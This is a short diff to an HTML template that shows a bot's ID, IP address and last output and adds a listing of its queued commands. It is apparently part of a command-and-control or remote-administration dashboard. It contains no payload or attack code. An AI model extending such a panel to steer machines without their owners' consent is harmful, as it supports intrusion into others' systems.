@@ -2,4 +2,8 @@
 	<h1>ID: {{bot.id}}</h1>
 	<h1>IP: {{bot.ip}}</h1>
 	<h1>Last output: {{bot.output}}</h1>
+	<h1>Command Queue: </h1>
+	{% for command in commands %}
+		<p> {{ command.cmd }}</p>
+	{% endfor %}
 </div>
